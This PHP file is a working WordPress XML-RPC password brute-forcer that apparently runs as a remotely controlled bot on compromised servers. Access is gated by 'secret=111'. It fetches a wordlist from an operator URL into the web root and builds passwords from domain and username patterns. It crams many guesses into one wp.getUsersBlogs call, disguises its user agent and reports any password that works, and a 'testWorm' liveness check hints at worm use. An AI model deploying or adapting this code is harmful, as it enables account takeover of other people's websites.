<?php

function get_text_fr_serv($url_s, $file_s){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url_s);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch,CURLOPT_TIMEOUT,60);
    $data = curl_exec($ch);
    file_put_contents($file_s, $data);
}
function checkWordsList($filename, $path, $hash){
    if(file_exists($_SERVER["DOCUMENT_ROOT"].'/'.$filename) and md5_file($_SERVER["DOCUMENT_ROOT"].'/'.$filename) == $hash){
        return true;
    }else{
        get_text_fr_serv($path, $_SERVER["DOCUMENT_ROOT"].'/'.$filename);
        if(file_exists($_SERVER["DOCUMENT_ROOT"].'/'.$filename) and md5_file($_SERVER["DOCUMENT_ROOT"].'/'.$filename) == $hash){
            return true;
        }else{
            return false;
        }
    }
}

function createFullRequest($login, $passwords){
    $xml = createRequestXML();
    for($i = 0; $i < count($passwords); $i++){
        $xml = addElementXML($xml, $login, $passwords[$i]);
    }
    $request = $xml->saveXML();
    //file_put_contents('request.txt', $request.PHP_EOL.PHP_EOL, FILE_APPEND | LOCK_EX);
    return $request;
}
function createRequestXML(){
    $xml = new DOMDocument();
    $xmlMethodCall = $xml->createElement("methodCall" );
    $xmlMethodName = $xml->createElement("methodName" );
    $xmlMethodName->nodeValue = 'wp.getUsersBlogs';
    $xml->appendChild( $xmlMethodCall );
    $xmlMethodCall->appendChild( $xmlMethodName );
    return $xml;
}

function addElementXML($xml, $user, $password){
    $xmlParams = $xml->createElement("params" );



    $xmlParam1 = $xml->createElement("param" );
    $xmlValue1 = $xml->createElement("value" );
    $xmlString1 = $xml->createElement("string" );
    $xmlString1->nodeValue = $user;
    $xmlValue1 ->appendChild( $xmlString1);
    $xmlParam1 ->appendChild( $xmlValue1 );


    $xmlParam2 = $xml->createElement("param" );
    $xmlValue2 = $xml->createElement("value" );
    $xmlString2 = $xml->createElement("string" );
    $xmlString2->nodeValue = htmlspecialchars($password);
    $xmlValue2 ->appendChild( $xmlString2);
    $xmlParam2 ->appendChild( $xmlValue2 );


    $xmlParams ->appendChild( $xmlParam1 );
    $xmlParams ->appendChild( $xmlParam2 );
    $xmlMethodCall = $xml->getElementsByTagName('methodCall')->item(0);
    $xmlMethodCall ->appendChild( $xmlParams );


    return $xml;
}

function createBrutePass($wordsList, $domain, $login, $startPass, $endPass){
    $handle = fopen($_SERVER["DOCUMENT_ROOT"].'/'.$wordsList, "r");
    $brutePassCounter=0;
    $resultGetDomainPattern = preg_match("/(.*)\..*/", $domain, $output_array);
    if ($handle) {
        $brutePass = array();
        while (($data = fgets($handle)) !== false) {
            $password = '';
            if($brutePassCounter>=$startPass and $brutePassCounter<=$endPass){
                $data = preg_replace("/[\n\r]/","",$data);
                if ($resultGetDomainPattern){
                    if(strpos($data,'%domainPattern%') !== false) {
                        $password = str_replace("%domainPattern%", strtolower($output_array[1]), $data);
                    }elseif(strpos($data,'%userName%') !== false) {
                        $password = str_replace('%userName%', $login, $data);
                    }else{
                        $password = $data;
                    }
                }else{
                    if(strpos($data,'%userName%') !== false) {
                        $password = str_replace('%userName%',  $login, $data);
                    }else{
                        $password = $data;
                    }
                }
                $brutePass[] = $password;
            }
            $brutePassCounter++;
        }
        if($brutePass[0]!=$login.'!@#$%^&*()_-.'){
            //file_put_contents('failed.txt', $brutePass[0] . ' != '. $login.' '.$domain.PHP_EOL, FILE_APPEND | LOCK_EX);
        }
        return $brutePass;
    }else{
        return false;
    }
}
function sendRequest($URL, $request){
    $xmlualist  = array("Poster", "WordPress", "Windows Live Writer", "wp-iphone", "wp-android", "wp-windowsphone");
    $xmlual = $xmlualist[array_rand($xmlualist)];
    $ch = curl_init($URL);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST' );
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Content-Type: text/xml',
    ));
    curl_setopt($ch, CURLOPT_USERAGENT, $xmlual);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "$request");
    curl_setopt($ch, CURLINFO_HEADER_OUT, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    curl_setopt($ch,CURLOPT_TIMEOUT,35);
    $output = curl_exec($ch);
    //file_put_contents('response.txt', $output.PHP_EOL.PHP_EOL, FILE_APPEND | LOCK_EX);
    $info = curl_getinfo($ch);
    $redir = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
    if(curl_errno($ch)) {
        $err = curl_error($ch);
        curl_close($ch);
        return array('code'=>$err,'output'=>$output);
    }
    curl_close($ch);
    if($info['http_code'] != 200){
        return array('code'=>$info['http_code'],'output'=>false);
    }else{
        return array('code'=>$info['http_code'],'output'=>$output);
    }
}

function getLink($domain){
    $ch = curl_init();
    $url = 'http://'.trim(strtolower($domain));
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLINFO_HEADER_OUT, true);
    curl_setopt($ch , CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36");
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Connection: keep-alive',
        'Accept-Language: uk,ru;q=0.8,en-US;q=0.5,en;q=0.3',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
    ));
    curl_setopt($ch,CURLOPT_TIMEOUT,15);
    $data = curl_exec($ch);
    if(curl_errno($ch)) {
        curl_close($ch);
        return 'http://'.trim(strtolower($domain)).'/xmlrpc.php';
    }
    $result = preg_match("/[\'\\\"]([0-9a-zA-Z\.\/\\\\\-\:]{0,}xmlrpc.php)/", $data, $output_array);
    if($result){
        curl_close($ch);
        return $output_array[1];
    }else{
        $redir = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
        curl_close($ch);
        $resultRedir = preg_match("/http:\/\/[[0-9a-zA-Z\.\-_]{0,}/", $redir, $output_array_redirect);
        if($resultRedir){
            return $output_array_redirect[0].'/xmlrpc.php';
        }else{
            return 'http://'.trim(strtolower($domain)).'/xmlrpc.php';
        }
    }
}
function validateXML($result){
    $pos = strpos($result['output'], '<?xml');
    if ($pos !== false and $pos != 0) {
        $result['output'] = substr($result['output'], $pos);
    }
    $pos = strpos($result['output'], '</methodR');
    if ($pos !== false) {
        $result['output'] = substr_replace($result['output'], '</methodResponse>', $pos, strlen($result['output']));
    }
    return $result;
}
function findPass($result,$brutePass){
    $xml = simplexml_load_string(trim($result['output']));
    if ($xml !== false) {
        $counter = 0;
        if (isset($xml->params->param->value->array->data->value)) {
            foreach ($xml->params->param->value->array->data->value as $rpc) {
                if (isset($rpc->struct->member[0]->name)) {
                    if ($rpc->struct->member[0]->name == 'faultCode') {

                    } else {
                        return array('status'=>'GOOD','success'=>$brutePass[$counter]);
                    }
                } else {
                    return array('status'=>'GOOD','success'=>$brutePass[$counter]);
                }
                $counter++;
            }
        } else {
            if (isset($xml->fault->value->struct->member->name)) {
                if ($xml->fault->value->struct->member->name == 'faultCode') {
                    return array('status'=>'OK_BUT_NONE','success'=>false);
                }
                return array('status'=>'VERY STRANGE_RESPONCE','success'=>false);
            }
            return array('status'=>'STRANGE_RESPONCE','success'=>false);
        }
    } else {
        return array('status'=>'XML_LOAD_FAILED','success'=>false);

    }
    return array('status'=>'OK_BUT_NONE','success'=>false);

}
if ($_GET['secret']=='111'){
    libxml_use_internal_errors(true);
    ini_set('memory_limit', '-1');
    ini_set('max_execution_time', 500000000000);
    if(checkWordsList($_GET['wordsList'],$_GET['path'],$_GET['hash'])){
        $brutePass = createBrutePass($_GET['wordsList'], $_GET['domain'],$_GET['login'],$_GET['startPass'],$_GET['endPass']);
        if($brutePass){
            $request = createFullRequest($_GET['login'], $brutePass);
            //file_put_contents('testPassCount.txt', $request.PHP_EOL.PHP_EOL.PHP_EOL, FILE_APPEND | LOCK_EX);
            $domain = getLink($_GET['domain']);
            $result = sendRequest($domain, $request);
            //file_put_contents('result1.txt', $result['output'].PHP_EOL.PHP_EOL.PHP_EOL, FILE_APPEND | LOCK_EX);
            if($result['code']==200) {
                $result = validateXML($result);
                $analyse = findPass($result, $brutePass);
                $final = array('code' => $result['code'], 'link' => $domain, 'result' => $analyse['status'], 'good'=>$analyse['success']);
                echo "%%%!!!".json_encode($final)."!!!%%%";
                exit;
            }else{
                $final = array('code' => $result['code'], 'link' => $domain, 'result' => $result['code']);
                echo "%%%!!!".json_encode($final)."!!!%%%";
                exit;
            }
        }else{
            $final = array('code' => "createBrutePass", 'link' => "createBrutePass", 'result' => "createBrutePass");
            echo "%%%!!!".json_encode($final)."!!!%%%";
            exit;
        }
    }else{
        $final = array('code' => "checkWordsList", 'link' => "checkWordsList", 'result' => "checkWordsList");
        echo "%%%!!!".json_encode($final)."!!!%%%";
        exit;
    }
}
if ($_POST['testWorm']=='111'){
    echo "%%%!!!IT_IS_ALIVE!!!%%%";

}

?>
